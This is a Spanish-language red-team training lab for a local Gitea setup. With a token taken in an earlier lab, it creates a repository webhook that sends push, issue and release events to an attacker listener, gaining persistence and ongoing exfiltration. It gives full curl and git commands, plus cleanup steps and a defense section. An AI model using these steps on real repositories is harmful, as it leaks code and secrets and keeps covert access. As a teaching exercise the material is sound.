# 06 - Webhook como canal de exfiltracion y persistencia

**Clase 2 · 20 min · M3 Demo 05**
**Fase:** persistencia + reconocimiento continuo
**MITRE ATT&CK:** T1078 (Valid Accounts), T1213 (Data from Information Repositories)
**Riesgo OWASP CI/CD:** CICD-SEC-5 (control de acceso del pipeline), CICD-SEC-10 (registro y visibilidad)

## Escenario

Volviste a entrar con el PAT del lab 02. Crear un webhook en el repo no te da
una shell, pero te da algo mas duradero: **cada push, issue o release del repo
llega a tu servidor**. Si pierdes el acceso interactivo, sigues viendo lo que
hace el equipo, incluido codigo nuevo que puede contener mas secretos.

## Objetivo de aprendizaje

- Crear un webhook con la API de Gitea usando el PAT.
- Entender que permisos hacen falta (admin del repo, no solo write).
- Validar la entrega con un evento real.

## Antes de empezar

```bash
cd devops-redteam
export G=http://localhost:3000
export PAT=$(grep GITEA_TOKEN seed/repo/secrets/dev_token.txt | cut -d= -f2)
curl -s http://localhost:8888/__clear
```

## Paso 1 - Confirmar permisos sobre el repo

```bash
curl -s -H "Authorization: token $PAT" \
  $G/api/v1/repos/devops-org/devops-demo \
  | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d["full_name"], d["permissions"])'
```

**Que esperar:** `devops-org/devops-demo {'admin': True, 'push': True, 'pull': True}`.

Si `admin` fuera `False`, la creacion del webhook fallaria con `403`. Es una
forma limpia de mapear privilegios antes de actuar.

## Paso 2 - Crear el webhook

```bash
curl -s -X POST -H "Authorization: token $PAT" -H 'Content-Type: application/json' \
  -d '{"type":"gitea","active":true,
       "events":["push","issues","release"],
       "config":{"url":"http://hookcat:8888/gitea/hook","content_type":"json"}}' \
  $G/api/v1/repos/devops-org/devops-demo/hooks | python3 -m json.tool
```

**Que esperar:** un objeto con `id`, `active: true` y `config.url` apuntando a
hookcat.

**Por que `http://hookcat:8888`:** Gitea entrega el webhook desde dentro del
contenedor. Desde ahi `localhost` es Gitea, no tu maquina.

## Paso 3 - Disparar un evento

Haz un push vacio (no necesitas cambiar codigo):

```bash
cd /tmp && rm -rf wtest
git clone http://dev:dev12345@localhost:3000/devops-org/devops-demo.git wtest
cd wtest
git -c user.name=dev -c user.email=dev@lab.local commit --allow-empty -m "ping"
git push
```

## Paso 4 - Verificar la entrega

```bash
sleep 4
curl -s http://localhost:8888/__requests \
  | python3 -c 'import sys,json;[print(x["method"],x["path"],"|",x.get("headers",{}).get("X-Gitea-Event","-")) for x in json.load(sys.stdin)]'
```

**Que esperar:** `POST /gitea/hook | push`.

El body incluye `repository.full_name`, `pusher`, `commits` y la lista de
archivos cambiados. En un ataque real eso permite ver cuando se toca
`.gitea/workflows` o `Jenkinsfile`.

## Paso 5 - Persistencia: que pasa si cambias la URL?

Un webhook no caduca. Mientras exista, cada evento se entrega. Puedes
comprobarlo volviendo a hacer push dentro de una hora. Ese es el motivo por el
que la respuesta defensiva empieza por **listar webhooks**, no por rotar
credenciales.

## Evidencia para el informe

- Respuesta de creacion (`id`, URL, eventos).
- Peticion `/gitea/hook` con cabecera `X-Gitea-Event` y payload.
- Captura de la lista de webhooks del repo.

## Limpieza

Borra el webhook para no dejar persistencia en el lab:

```bash
ID=$(curl -s -H "Authorization: token $PAT" \
  $G/api/v1/repos/devops-org/devops-demo/hooks \
  | python3 -c 'import sys,json;print([h["id"] for h in json.load(sys.stdin) if h["config"]["url"].endswith("/gitea/hook")][0])')
curl -s -o /dev/null -w 'delete %{http_code}\n' -X DELETE \
  -H "Authorization: token $PAT" \
  $G/api/v1/repos/devops-org/devops-demo/hooks/$ID
```

## Checkpoint

1. Que privilegio minimo hace falta para crear un webhook y por que no basta
   con `write` en algunos casos?
2. Que eventos elegirias para detectar un cambio en el pipeline?
3. Como distinguiria un defensor un webhook legitimo de uno malicioso?

## Defensa

- Revisar webhooks periodicamente (Settings -> Webhooks) y alertar de destinos
  nuevos o dominios no allowlisted.
- Restringir quien puede crear hooks (admin de repo, no write).
- Allowlist de dominios de salida y firmar/verificar entregas.
- Rotar el PAT que creo el hook; borrar el hook no invalida la llave.
